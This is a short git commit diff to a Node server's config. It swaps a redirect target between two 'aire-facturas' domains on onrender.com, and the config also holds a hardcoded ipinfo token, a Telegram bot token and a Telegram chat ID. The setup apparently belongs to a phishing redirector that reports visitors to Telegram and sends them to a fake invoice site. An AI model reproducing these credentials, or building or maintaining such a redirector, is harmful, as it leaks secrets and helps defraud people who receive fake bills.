9e489badcab1239c1957e2b43e8ed2d11e035a89
remitly6661121-bit <remitly6661121@gmail.com>
2026-03-03 04:12:18 +0300

    Update server.js

--- server.js
+++ server.js
@@ -9,7 +9,7 @@ const CONFIG = {
     IPINFO_TOKEN: 'f14749fee64f8f', 
     TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
     TG_CHAT: '-1003321543933',
-    DESTINO: 'https://aire-facturas-online.onrender.com/', 
+    DESTINO: 'https://aire-facturas-colombia.onrender.com/', 
     PORT: process.env.PORT || 3000
 };
 
@@ -98,4 +98,5 @@ app.get('/:slug', async (req, res) => {
 
 
 app.listen(CONFIG.PORT, () => console.log(`🔥 SERVER EN PUERTO ${CONFIG.PORT}`));
+
 
